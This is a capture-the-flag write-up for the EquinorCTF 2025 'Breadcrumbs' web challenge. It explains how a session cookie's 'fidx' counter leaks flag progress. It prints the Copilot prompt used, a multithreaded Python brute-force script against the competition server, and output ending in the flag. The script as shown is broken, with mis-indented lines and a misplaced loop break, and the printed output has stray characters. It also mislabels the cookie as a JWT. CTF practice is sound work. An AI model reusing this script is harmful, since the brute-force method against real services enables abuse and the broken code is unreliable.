# Breadcrumbs - EquinorCTF 2025

### ===== Challenge =====
- Follow the breadcrumbs to find the flag!
### ===== Analysis =====
- We are presented with a page that has a keyboard. I instinctively start typindg the flag format.
![](./Breadcrumbs_keyboard.png)

- However, when I press a key that isn't correct, the letters dissapear and I have to start again. The web app **GET's /E when I press 'E'** to /P when I press 'P', etc.

- I immediately start thinking about **how the server is keeping track of where I am in the flag**, so I decide to take a look at the cookies when I have `EPT{` typed in: 

`session=eyJmaWR4Ijo0LCJzZXNzaW9uX2lkIjoiYmQ2YzhkOTAtNGI4My00MTZjLWFjYWMtMTc5NTk0YzQzZTY3In0.aRIchA.g-VeUaUvl7uJTH0Q-ePc88zZh8g`

- This looks like a **JWT**, so i put it into a decoder:

![](./Breadcrumbs_JWT.png)

- It's a JWT with a weird payload. But the **fidx header** contains the number 4! At this point I had guessed 4 characters (`EPT{`), so this is definitely how the server keeps track!

- All I have to do is write a script to brute force the possible characters and if a session cookie containing the next fidx is returned by the server, it means we discovered the right character. When I discover a character, the next requests are sent with the new session, and so on.

### ===== Exploitation =====

- After all this is a competition with limited time, so I decided to use my friend Copilot to help me write this script:

``` prompt
I'm playing a CTF and I need you to write me a multithreaded bruteforce script.
I need you to bruteforce the https://breadcrumbs.ept.gg/* endpoint (GET) using the characters in the image I sent.
The session cookie is a JWT that contains the field 'fidx' in its header. fidx represents the current char.
If the attempt succeeds, the current_fidx will be incremented. Else, it will go back to 0
I've already discovered 'EPT{' and you must stop when the correct character is a '}'
```

- After changing a bit the script it spat out, i ended with this:

``` python
import requests
import base64
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

BASE_URL = "https://breadcrumbs.ept.gg"
CHARS = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=[]{}|;:',.<>?/~` \"\\"
  
print_lock = Lock()

def decode_session_cookie(cookie_value):
	try:
		parts = cookie_value.split('.')	
		if len(parts) >= 2:
			payload = parts[0]
			padding = 4 - len(payload) % 4
		if padding != 4:
		payload += '=' * padding
		decoded = base64.b64decode(payload)
		data = json.loads(decoded)
		return data.get('fidx', -1)
	except Exception as e:
		return -1

  

def rebuild_session(known_flag):
    session = requests.Session()
    for char in known_flag:
        response = session.get(f"{BASE_URL}/{char}", timeout=5)
    if response.status_code != 200:
        return None, 0
    return session, len(known_flag)

  

def try_char(char, current_flag, expected_fidx):
	try:
		session, fidx = rebuild_session(current_flag)
		if session is None:
			return char, False, -1
	
		response = session.get(f"{BASE_URL}/{char}", timeout=5)
		new_cookie = session.cookies.get('session', domain='breadcrumbs.ept.gg')
		
		if new_cookie:
			new_fidx = decode_session_cookie(new_cookie)
		with print_lock:
			print(f"Trying: {current_flag}{char} -> fidx={new_fidx}", end=" \r")
		if new_fidx == expected_fidx:
			return char, True, new_fidx
		return char, False, -1
	except Exception as e:
		return char, False, -1

def brute_force_parallel(known_flag="EPT{", max_workers=20):

	current_flag = known_flag
	print(f"Starting with: {current_flag}")
	
	while True:
		found_char = None
		expected_fidx = len(current_flag) + 1
		print(f"\n[*] Looking for character at position {len(current_flag)} (expecting fidx={expected_fidx})")
		
		with ThreadPoolExecutor(max_workers=max_workers) as executor:
			futures = {executor.submit(try_char, char, current_flag, expected_fidx): char for char in CHARS}
			for future in as_completed(futures):
				char, success, fidx = future.result()
		
				if success:
					found_char = char
					print(f"\n✓ Found correct char: '{char}' (fidx={fidx}) ")
		
					for f in futures:
						f.cancel()
					break
		
		if found_char:
			current_flag += found_char
			print(f"[+] Flag so far: {current_flag}")
		
			if found_char == '}':
				print(f"\n🎉 Complete flag: {current_flag}")
				return current_flag
		else:
			print(f"\n[-] No valid character found. Flag so far: {current_flag}")
		break
	return current_flag

  
if __name__ == "__main__":
	flag = brute_force_parallel(known_flag="EPT{")
```

- I left the script running and left the room to go eat some dinner:

![](./Breadcrumbs_lazagna.png)

- When I got back, **BOOM!** Nothing better than a full belly and a flag!

``` bash
[*] Looking for character at position 39 (expecting fidx=40)
Trying: EPT{2a65f323-6df3-a713-bc1a-e80afb6ca9fd -> fidx=40    
✓ Found correct char: 'd' (fidx=40)                    
[+] Flag so far: EPT{2a65f323-6df3-a713-bc1a-e80afb6ca9fd0    

[*] Looking for character at position 40 (expecting fidx=41)
Trying: EPT{2a65f323-6df3-a713-bc1a-e80afb6ca9fd} -> fidx=41    
✓ Found correct char: '}' (fidx=41)                    
[+] Flag so far: EPT{2a65f323-6df3-a713-bc1a-e80afb6ca9fd}0     

🎉 Complete flag: EPT{2a65f323-6df3-a713-bc1a-e80afb6ca9fd}
```

- **Flag: EPT{2a65f323-6df3-a713-bc1a-e80afb6ca9fd}**

team: *synapse_burnout*
writeup by *varanda* - 10/11/2025